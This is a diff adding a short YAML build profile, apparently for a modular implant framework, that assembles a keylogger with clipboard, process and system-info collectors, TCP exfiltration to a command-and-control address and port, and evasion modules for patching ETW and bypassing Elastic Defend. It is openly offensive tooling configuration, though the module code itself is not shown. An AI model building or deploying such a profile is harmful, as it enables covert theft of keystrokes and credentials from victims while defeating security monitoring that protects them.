@@ -1,0 +1,27 @@
+name: keylogger_elastic_bypass
+description: API keylogger with Elastic Defend call gadget bypass
+
+core:
+  - core/emit_buffer
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+evasion:
+  - evasion/etw_patch
+  - evasion/elastic_gadget
+  - evasion/header_stomp
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  FLUSH_INTERVAL_MS: "30000"
+  BATCH_DURATION_MS: "30000"
